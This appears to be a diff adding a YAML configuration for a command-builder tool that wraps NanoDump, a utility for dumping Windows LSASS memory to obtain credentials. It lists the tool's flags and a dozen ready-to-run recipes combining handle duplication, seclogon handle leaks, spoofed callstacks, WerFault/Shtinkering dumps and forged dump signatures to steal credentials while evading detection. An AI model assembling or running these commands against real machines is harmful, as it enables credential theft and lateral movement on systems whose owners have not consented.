@@ -1,0 +1,192 @@
+---
+projectLink: https://github.com/fortra/nanodump
+name: NanoDump
+languages:
+  - name: EXE
+    prefix: 'nanodump.x64.exe'
+
+params:
+  - name: Output
+    type: label
+
+  - name: DumpPath
+    type: text
+    description: File path of the dump
+    template: "--write {0}"
+    default: 'C:\temp\out.dmp'
+    optional: true 
+  - name: Valid
+    type: flag
+    description: Create a dump with a valid signature
+    value: "--valid"
+    optional: true 
+    selected: false
+
+  - name: Dump via handle to LSASS
+    type: label
+
+  - name: Duplicate
+    type: flag
+    description: duplicate a high privileged existing LSASS handle
+    value: '--duplicate'
+    optional: true
+    selected: false
+
+  - name: DuplicateLow
+    type: flag
+    description: duplicate a low privileged existing LSASS handle and then elevate it
+    value: '--duplicate-elevate'
+    optional: true
+    selected: false
+
+  - name: SeclogonLeakLocal
+    type: flag
+    description: leak an LSASS handle into nanodump via seclogon
+    value: '--seclogon-leak-local'
+    optional: true
+    selected: false
+
+  - name: SeclogonLeakRemote
+    type: text
+    description: leak an LSASS handle into another process via seclogon and duplicate it
+    template: '--seclogon-leak-remote {0}'
+    default: "C:\\Windows\\notepad.exe"
+    optional: true
+    selected: false
+  - name: SeclogonDuplicate
+    type: flag
+    description: make seclogon open a handle to LSASS and duplicate it
+    value: '--seclogon-duplicate'
+    optional: true
+    selected: false
+  - name: SpoofCallstack
+    type: flag
+    description: open a handle to LSASS using a fake calling stack
+    value: '--spoof-callstack'
+    optional: true
+    selected: false
+  - name: EelevateHandle
+    type: flag
+    description: open a handle to LSASS with low privileges and duplicate it to gain higher privileges
+    value: '--elevate-handle'
+    optional: true
+    selected: false    
+
+  - name: Dump via WerFault.exe
+    type: label
+
+  - name: SilentProcessExit
+    type: text
+    description: Force WerFault.exe to dump LSASS via SilentProcessExit
+    template: '--silent-process-exit {0}'
+    default: "C:\\Windows\\Temp\\"
+    optional: true
+    selected: false
+  - name: Shtinkering
+    type: flag
+    description: Force WerFault.exe to dump LSASS via Shtinkering
+    value: '--shtinkering'
+    optional: true
+    selected: false
+
+
+  - name: Fork / Snapshot dump (Avoid Direct Read)
+    type: label
+
+  - name: Fork
+    type: flag
+    description: Fork the target process before dumping
+    value: '--fork'
+    optional: true
+    selected: false
+  - name: Snapshot
+    type: flag
+    description: Snapshot the target process before dumping
+    value: '--snapshot'
+    optional: true
+    selected: false
+
+
+  - name: Misc
+    type: label
+
+  - name: GetPid
+    type: flag
+    description: Print the PID of LSASS and exit
+    value: '--getpid'
+    optional: true
+    selected: false
+
+sections:
+  - name: Read LSASS indirectly by creating a fork and write the dump to disk with an invalid signature
+    labels: [LSASS, Creds]
+    mitre: ''
+    verb: ''
+    required_flags: [Fork, DumpPath]
+    optional_flags: []
+  - name: Leak an LSASS handle in a notepad process, get access to LSASS via handle duplicate, then read it indirectly by creating a fork.
+    labels: [LSASS, Creds]
+    mitre: ''
+    verb: ''
+    required_flags: [SeclogonLeakRemote, Fork, Valid]
+    optional_flags: [DumpPath]
+  - name: Get a handle with seclogon leak local, read LSASS indirectly by using a fork. Write the dump with a valid signature
+    labels: [LSASS, Creds]
+    mitre: ''
+    verb: ''
+    required_flags: [SeclogonLeakLocal, Fork, Valid, DumpPath]
+    optional_flags: []    
+  - name: Duplicate an existing handle and write the dump to disk with an invalid signature.
+    labels: [LSASS, Creds]
+    mitre: ''
+    verb: ''
+    required_flags: [Duplicate, DumpPath]
+    optional_flags: []
+  - name: Trick seclogon to open a handle to LSASS and duplicate it.
+    labels: [LSASS, Creds]
+    mitre: ''
+    verb: ''
+    required_flags: [SeclogonDuplicate]
+    optional_flags: [DumpPath]
+  - name: Open a handle to LSASS with an spoofed callstack.
+    labels: [LSASS, Creds]
+    mitre: ''
+    verb: ''
+    required_flags: [SpoofCallstack]
+    optional_flags: [DumpPath]
+  - name: Make the WerFault.exe process create a full memory dump in the Temp folder.
+    labels: [LSASS, Creds]
+    mitre: ''
+    verb: ''
+    required_flags: [SilentProcessExit]
+    optional_flags: []            
+  - name: Use the Shtinkering techinque (Werfault).
+    labels: [LSASS, Creds]
+    mitre: ''
+    verb: ''
+    required_flags: [Shtinkering]
+    optional_flags: []
+  - name: Obtain a handle using seclogon leak local and create the dump using the Shtinkering techinque.
+    labels: [LSASS, Creds]
+    mitre: ''
+    verb: ''
+    required_flags: [SeclogonLeakLocal, Shtinkering]
+    optional_flags: []
+  - name: Obtain a handle with low privs using a spoofed callstack and elevate it.
+    labels: [LSASS, Creds]
+    mitre: ''
+    verb: ''
+    required_flags: [EelevateHandle, SpoofCallstack]
+    optional_flags: []
+  - name: Duplicate an existing low priv handle and elevate it.
+    labels: [LSASS, Creds]
+    mitre: ''
+    verb: ''
+    required_flags: [DuplicateLow]
+    optional_flags: [] 
+  - name: Get the Process ID of LSASS.exe.
+    labels: [LSASS, Creds]
+    mitre: ''
+    verb: ''
+    required_flags: [GetPid]
+    optional_flags: []
